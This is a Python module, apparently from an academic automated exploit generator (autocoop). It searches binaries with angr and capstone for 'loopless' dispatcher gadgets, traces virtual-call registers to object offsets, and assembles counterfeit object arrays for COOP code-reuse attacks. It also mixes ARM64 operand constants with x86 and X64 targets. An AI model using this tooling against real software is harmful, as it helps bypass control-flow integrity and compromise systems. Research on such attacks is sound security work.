from autocoop.builder.builder import *
import autocoop.esl_lib.lib_utils.candidate_finder as candidate_finder
import autocoop.esl_lib.lib_utils.capstone_utils as capstone_utils
import logging
import angr
from capstone import arm64
import itertools

def generate_main(app, config, calltargets_order):
    """
    Generates the object dispatch loop gadget and the array builder.

    The the offsets for the object array ptr and the object array length are generated by stepping though the
    disassembled code, from the virtual function call/the loop exit condition, tracking the relevant registers until
    the offset is found.

    :param angr.Project app: application the gadget will be found for
    :param Config config: configuration of the exploit generator
    :param list[int] calltargets_order: list of calltargets in the order they are called in
    :return: Array builder object ready for more objects to be added and vptr offset

    """
    logger = logging.getLogger("autocoop.esl_lib.loopless")
    logger.info("[*] Building Callsite Candidate Set")
    # app.analyses.CFGFast()
    if config.other_args.get("policy", None):
        candidates = list(candidate_finder.get_candidate_callsites_from_csv(app, config.other_args["gadget_csv"]))
    else:
        candidates = list(candidate_finder.get_all_functions(app))
        candidates_new = []
        for vtbl, candidate in candidates:
            candidates_new.append((vtbl, candidate) + (candidate.rebased_addr-app.loader.main_object.min_addr, None))
        candidates = candidates_new
    min_addr = app.loader.main_object.min_addr
    for vtable, gadget, offset, calltargets_raw in candidates:
        if type(gadget) == int:
            gadget = app.loader.find_symbol(min_addr+offset)
        logger.info("[*] Evaluating potential LOOPLESS gadget: {}".format(gadget))
        insns = capstone_utils.get_function_capstone(app, gadget)
        # find first call
        # 1. seek forward until first call is found
        # 2. find the register relevant to the call
        # 3. find object ptr offsets
        call_1_index = 0
        while call_1_index < len(insns):
            if insns[call_1_index].mnemonic == "call" and insns[call_1_index].operands[0].mem.base != 0:
                break
            call_1_index += 1
        else:
            continue
        logger.info("[!] Finished step 1 (find call): {}".format(gadget))
        call_ins = insns[call_1_index]
        if call_ins.mnemonic != "call":
            continue
        if len(call_ins.operands) != 1:
            continue
        operand = call_ins.operands[0]
        if operand.type != arm64.ARM64_OP_MEM:
            continue
        if operand.mem.base == 0:
            continue
        config.vptr_offset = operand.mem.disp / 8
        assignment_index = call_1_index
        reg = operand.mem.base
        logger.info("[!] Finished step 2 (find relevant registers): {}".format(gadget))
        array_1_offset = []
        while assignment_index > 0 and not array_1_offset:
            assignment_index -= 1
            res = capstone_utils.find_reg_source(insns[assignment_index], reg)
            if not res:
                continue
            reg, array_offset_tmp, _, _ = res
            if array_offset_tmp:
                array_1_offset.append(array_offset_tmp)
        else:
            if not array_1_offset:
                continue
        logger.info("[!] Finished step 3 (find object ptr offsets): {}".format(gadget))

        # find second call

        call_2_index = call_1_index + 1
        while call_2_index < len(insns):
            if insns[call_2_index].mnemonic == "call" and insns[call_2_index].operands[0].mem.base != 0:
                break
            call_2_index += 1
        else:
            continue
        logger.info("[!] Finished step 4 (find call): {}".format(gadget))
        call_ins = insns[call_2_index]
        if call_ins.mnemonic != "call":
            continue
        if len(call_ins.operands) != 1:
            continue
        operand = call_ins.operands[0]
        if operand.type != arm64.ARM64_OP_MEM:
            continue
        if operand.mem.base == 0:
            continue
        vptr_2_offset = operand.mem.disp / 8
        assignment_index = call_2_index
        reg = operand.mem.base
        logger.info("[!] Finished step 5 (find relevant registers): {}".format(gadget))
        array_2_offset = []
        while assignment_index > 0:
            assignment_index -= 1
            res = capstone_utils.find_reg_source(insns[assignment_index], reg)
            if not res:
                continue
            reg, array_offset_tmp, _, _ = res
            if array_offset_tmp:
                array_2_offset.append(array_offset_tmp)
        else:
            if not array_2_offset:
                continue
        logger.info("[!] Finished step 6 (find object ptr offsets): {}".format(gadget))

        if vtable == 1:
            initObj = Object(vIndex=0, vFunc=vtable, noFakeVtable=False, fixedOffset=0)
        else:
            initObj = Obj64(fixedOffset=0)
            initObj.setVptr(vtable)


        descriptors = [LooplessBuilder.InvocationDescriptor(vindex=config.vptr_offset, offsetThisPtr=array_1_offset[0]),
                       LooplessBuilder.InvocationDescriptor(vindex=vptr_2_offset, offsetThisPtr=array_2_offset[0])]
        b = LooplessBuilder(Arch.X64, config.base_buf, 0, ptrVtableRecGadget=vtable, descriptors=descriptors)

        if config.other_args.get("dispatcheranalysis", None):
            calltargets = None
        else:
            if config.other_args["policy"] and calltargets_raw:
                print "generating calltarget set"
                calltargets = candidate_finder.get_candidate_gadgets_from_line(app, calltargets_raw, config.other_args["policy"])
            else:
                calltargets = candidate_finder.get_all_functions(app)

        yield b, gadget, calltargets
    raise StopIteration("No candidate callsites left.")


def update_main(recbuilder, calltargets):
    """
    Adds objects to array builder

    :param recbuilder: Recurstion builder to add objects to
    :param list calltargets: list of calltargets and builder objects
    """
    for vtable_addr, _,  obj in calltargets:
        recbuilder.addObj(obj, vtable_addr)


gadget = generate_main, update_main
